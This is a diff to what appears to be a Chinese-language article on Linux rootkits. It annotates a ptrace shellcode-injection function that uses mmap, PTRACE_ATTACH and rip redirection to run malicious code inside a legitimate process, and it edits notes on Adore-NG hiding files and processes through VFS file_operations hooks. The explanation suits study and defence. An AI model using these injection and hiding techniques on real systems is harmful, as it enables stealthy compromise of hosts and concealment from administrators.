@@ -56,6 +56,7 @@ struct dirent *readdir(DIR *dir) {
 
 ```CPP
 void inject_code(pid_t pid, unsigned char *code, size_t len) {
+    //1、首先通过mmap分配一块可读、可写、可执行的内存，将shellcode复制进去
     void *mem = mmap(NULL, len, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
     if (mem == MAP_FAILED) {
         perror("mmap error");
@@ -63,6 +64,7 @@ void inject_code(pid_t pid, unsigned char *code, size_t len) {
     }
     memcpy(mem, code, len);
 
+    //2、使用ptrace的PTRACE_ATTACH附加到目标进程，获取其寄存器状态（struct user_regs_struct），修改指令指针rip指向注入的代码
     if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) == -1) {
         perror("ptrace error");
         return;
@@ -72,6 +74,8 @@ void inject_code(pid_t pid, unsigned char *code, size_t len) {
     ptrace(PTRACE_GETREGS, pid, NULL, &regs);
     regs.rip = (unsigned long)mem;
     ptrace(PTRACE_SETREGS, pid, NULL, &regs);
+
+    //3、分离进程让其执行恶意代码
     ptrace(PTRACE_DETACH, pid, NULL, NULL);
 }
 
@@ -88,11 +92,7 @@ int main() {
 }
 ```
 
-
-它的原理是利用ptrace将恶意shellcode注入合法进程的内存空间，代码运行于内存，无需磁盘文件，隐蔽性高于LD_PRELOAD。这里展示的代码首先通过mmap分配一块可读、可写、可执行的内存，将shellcode复制进去。然后使用ptrace的PTRACE_ATTACH附加到目标进程，获取其寄存器状态（struct user_regs_struct），修改指令指针rip指向注入的代码，最后分离进程让其执行恶意代码。
-
-用途：隐藏恶意行为，伪装为合法进程。
-挑战：需要root权限，ptrace调用可能被监控
+它的原理是利用`ptrace`将恶意shellcode注入合法进程的内存空间，代码运行于内存，无需磁盘文件，隐蔽性高于`LD_PRELOAD`
 
 ##  0x03    内核态Rootkit
 内核态Rootkit运行在Ring 0，控制系统资源，隐蔽性极高
@@ -186,8 +186,8 @@ is_invisible(pid_t pid)
 
 2、[Adore-NG](https://github.com/yaoyumeng/adore-ng/)
 
--   [进程隐藏](https://github.com/yaoyumeng/adore-ng/blob/master/adore-ng.c#L193)：与`Diamorphine`实现类似
--   [文件隐藏]()：值得一提的是，adore-ng是通过修改VFS架构中的`file_operations`的实现来完成的，主要是`f_op->readdir`、`f_op->iterate`这两个方法，代码如下
+-   [文件隐藏]()：通过修改VFS中的`file_operations`的实现来完成的，主要是`f_op->readdir`、`f_op->iterate`这两个方法
+-   [进程隐藏](https://github.com/yaoyumeng/adore-ng/blob/master/adore-ng.c#L193)：同上，也通过修改VFS的`procfs`类型的上述方法来实现
 
 ```CPP
 int patch_vfs(const char *p, 
